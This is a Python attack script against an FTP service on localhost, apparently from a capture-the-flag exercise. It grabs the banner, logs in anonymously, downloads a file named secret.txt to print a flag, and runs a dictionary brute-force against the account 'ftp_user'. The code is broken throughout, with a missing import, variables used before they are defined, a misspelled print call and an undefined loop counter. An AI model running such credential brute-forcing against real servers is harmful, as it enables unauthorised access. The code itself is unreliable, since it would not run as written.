import socket

address = "127.0.0.1"
port = 21
banner = ftp.connect(server, port)

# Grab the banner
print("[+] Starting FTP attack")
if "220" in str(banner):
    print("[+] Connected")
else:
    pint("[-] FTP service not responding")
    exit(1)

# Try anonymous login
try:
    ftp = ftplib.FTP(address)
    ftp.login()
    print("[+] Anonymous login successful")
    ftp.cwd("ftp")
    ftp.dir()
except:
    print("[-] Anonymous login disable")
    exit(1)

answer = str(ftp.retrbinary('RETR secret.txt', open('secret.txt', 'wb').write))
if "226" in answer:
    print("[+] Transfer complete")
else:
    print("[-] Transfer failed")
    exit(1)

with open("secret.txt") as file:
    pwd = str(file.readlines()).replace("\\n']","").replace("['","")
    user_pass = str(pwd).split(" ")[2]
    print("[+] Flag 1 : " + user_pass)
    ftp.quit()

ftp = ftplib.FTP(address)
with open("password_dictionary.txt") as file:
    pwd = file.readlines()
    for elem in pwd:
        elem = str(elem).replace("\n","")
        print("[+] Bruteforcing FTP user account")
        while loop < len(file):
            try:
                ftp.login("ftp_user",elem)
                print("[+] User password found : " + str(elem))
                break
            except socket.error as error:
                ftp = ftplib.FTP(address)
            except:
                pass
